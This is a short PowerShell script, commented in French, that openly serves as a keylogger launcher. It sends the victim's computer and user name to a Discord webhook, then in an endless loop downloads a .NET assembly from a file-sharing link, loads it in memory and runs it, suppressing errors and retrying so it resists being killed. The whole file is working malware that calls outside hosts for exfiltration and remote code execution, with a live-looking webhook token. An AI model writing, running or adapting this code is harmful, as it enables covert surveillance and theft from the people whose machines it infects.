$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"

# Message de démarrage
iwr $webhook -Method Post -Body (@{content="Keylogger lancé sur $env:COMPUTERNAME – $env:USERNAME"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

# Lancement en mémoire + boucle anti-kill (le truc qui marche en 2025)
while ($true) {
    try {
        $bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
        $asm = [Reflection.Assembly]::Load($bytes)
        $asm.EntryPoint.Invoke($null,$null)
    } catch {}
    Start-Sleep -Seconds 10
}
